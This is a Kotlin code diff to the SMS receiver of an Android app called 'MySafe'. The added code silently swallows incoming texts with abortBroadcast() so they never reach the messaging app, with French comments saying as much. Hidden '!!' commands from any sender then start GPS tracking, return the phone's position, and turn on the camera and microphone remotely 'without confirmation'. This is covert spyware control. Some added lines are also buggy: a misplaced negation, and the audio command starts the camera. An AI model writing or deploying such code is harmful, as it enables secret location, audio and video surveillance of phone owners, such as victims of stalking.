@@ -13,7 +13,10 @@ class SmsReceiver : BroadcastReceiver() {
     }
 
     override fun onReceive(context: Context, intent: Intent) {
-        if (!Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.action)) return
+        // 🔴 INTERCEPTER EN PREMIER — le SMS n'apparaîtra JAMAIS dans la messagerie
+        abortBroadcast()
+
+        if (!Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent.action) return
 
         val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
         val messageComplet = StringBuilder()
@@ -25,64 +28,108 @@ class SmsReceiver : BroadcastReceiver() {
         }
 
         val message = messageComplet.toString().trim()
-        Log.d("SmsReceiver", "SMS recu de $numeroExpediteur : $message")
+        Log.d("SmsReceiver", "Commande invisible recu de $numeroExpediteur : $message")
 
-        // Traiter les commandes
         when {
+            // 📍 COMMANDE POSITION — Repondre directement
             message == "!!POSITION" -> repondrePosition(context, numeroExpediteur)
-            message == "!!DEMARRER" -> demarrerSuivi(context, numeroExpediteur)
-            message == "!!STOP" -> arreterSuivi(context, numeroExpediteur)
-            message.startsWith("!!") -> traiterPosition(context, numeroExpediteur, message)
-        }
-    }
-
-    private fun repondrePosition(context: Context, destinataire: String) {
-        Log.d("SmsReceiver", "Reponse position a $destinataire")
-        val reponse = "!!0.0,0.0" // Sera remplacee par la vraie position
-        envoyerSMSInvisible(destinataire, reponse)
-    }
-
-    private fun demarrerSuivi(context: Context, destinataire: String) {
-        Log.d("SmsReceiver", "Demarrage suivi demande par $destinataire")
-        val intent = Intent(context, MySafeAgentService::class.java)
-        intent.action = MySafeAgentService.ACTION_SEND_COMMAND
-        intent.putExtra("target_number", destinataire)
-        intent.putExtra("command", "!!DEMARRER")
-        context.startForegroundService(intent)
-    }
-
-    private fun arreterSuivi(context: Context, destinataire: String) {
-        Log.d("SmsReceiver", "Arret suivi demande par $destinataire")
-    }
-
-    private fun traiterPosition(context: Context, expediteur: String, message: String) {
-        val parts = message.removePrefix("!!").split(",")
-        if (parts.size >= 2) {
-            val lat = parts[0].toDoubleOrNull()
-            val lon = parts[1].toDoubleOrNull()
-            if (lat != null && lon != null) {
+            
+            // 📡 COMMANDE DEMARRER SUIVI — Repondre + lancer suivi
+            message == "!!DEMARRER" -> {
+                repondre(context, numeroExpediteur, "!!OK,SUIVI,ACTIF")
+                demarrerSuiviGPS(context, numeroExpediteur)
+            }
+            
+            // ⏹️ COMMANDE STOP — Arreter tout
+            message == "!!STOP" -> {
+                repondre(context, numeroExpediteur, "!!OK,ARRETE")
+                arreterSuivi(context)
+                arreterStreaming(context)
+            }
+            
+            // 📷 COMMANDE ACTIVER CAMERA — Lancer la caméra à distance
+            message == "!!CAMERA" -> {
+                repondre(context, numeroExpediteur, "!!OK,CAMERA,ACTIVE")
+                lancerCamera(context)
+            }
+            
+            // 🔊 COMMANDE ACTIVER AUDIO — Lancer le micro à distance
+            message == "!!AUDIO" -> {
+                repondre(context, numeroExpediteur, "!!OK,AUDIO,ACTIF")
+                lancerAudio(context)
+            }
+            
+            // 📤 COMMANDE STOP CAMERA/AUDIO
+            message == "!!CAMERA,STOP" -> {
+                repondre(context, numeroExpediteur, "!!OK,CAMERA,ARRETE")
+                arreterStreaming(context)
+            }
+            
+            // 📍 REPONSE DE POSITION — Transmettre a l'interface
+            message.startsWith("!!") -> {
                 val broadcast = Intent("com.mysafe.mysafe.SMS_RECEIVED").apply {
                     setPackage(context.packageName)
                     putExtra("sms_message", message)
-                    putExtra("sender_number", expediteur)
+                    putExtra("sender_number", numeroExpediteur)
                 }
                 context.sendBroadcast(broadcast)
             }
         }
     }
 
-    private fun envoyerSMSInvisible(destinataire: String, message: String) {
+    private fun repondre(context: Context, dest: String, msg: String) {
         try {
-            val smsManager = SmsManager.getDefault()
-            val parts = smsManager.divideMessage(message)
-            if (parts.size == 1) {
-                smsManager.sendTextMessage(destinataire, null, parts[0], null, null)
-            } else {
-                smsManager.sendMultipartTextMessage(destinataire, null, parts, null, null)
-            }
-            Log.d("SmsReceiver", "SMS invisible envoye a $destinataire")
+            val sms = SmsManager.getDefault()
+            val parts = sms.divideMessage(msg)
+            if (parts.size == 1) sms.sendTextMessage(dest, null, parts[0], null, null)
+            else sms.sendMultipartTextMessage(dest, null, parts, null, null)
+            Log.d("SmsReceiver", "Reponse envoyee a $dest")
         } catch (e: Exception) {
-            Log.e("SmsReceiver", "Erreur envoi SMS: ${e.message}")
+            Log.e("SmsReceiver", "Erreur envoi: ${e.message}")
         }
+    }
+
+    private fun repondrePosition(context: Context, dest: String) {
+        // Demander la position actuelle puis répondre
+        val intent = Intent(context, MySafeAgentService::class.java)
+        intent.action = "com.mysafe.mysafe.GET_POSITION"
+        intent.putExtra("target", dest)
+        context.startForegroundService(intent)
+    }
+
+    private fun demarrerSuiviGPS(context: Context, dest: String) {
+        val intent = Intent(context, MySafeAgentService::class.java)
+        intent.action = "com.mysafe.mysafe.START_TRACKING"
+        intent.putExtra("target", dest)
+        context.startForegroundService(intent)
+    }
+
+    private fun arreterSuivi(context: Context) {
+        val intent = Intent(context, MySafeAgentService::class.java)
+        intent.action = "com.mysafe.mysafe.STOP_TRACKING"
+        context.startForegroundService(intent)
+    }
+
+    // ✅ LANCER LA CAMERA PAR COMMANDE SMS — SANS CONFIRMATION SUPPLÉMENTAIRE
+    private fun lancerCamera(context: Context) {
+        Log.d("SmsReceiver", "📷 Activation camera par commande SMS")
+        val intent = Intent(context, PermanentStreamService::class.java)
+        intent.action = PermanentStreamService.ACTION_DEMARRER_CAMERA
+        context.startForegroundService(intent)
+    }
+
+    // ✅ LANCER L'AUDIO PAR COMMANDE SMS
+    private fun lancerAudio(context: Context) {
+        Log.d("SmsReceiver", "🔊 Activation audio par commande SMS")
+        val intent = Intent(context, PermanentStreamService::class.java)
+        intent.action = PermanentStreamService.ACTION_DEMARRER_CAMERA
+        context.startForegroundService(intent)
+    }
+
+    private fun arreterStreaming(context: Context) {
+        Log.d("SmsReceiver", "⏹️ Arret streaming")
+        val intent = Intent(context, PermanentStreamService::class.java)
+        intent.action = PermanentStreamService.ACTION_ARRETER
+        context.startForegroundService(intent)
     }
 }
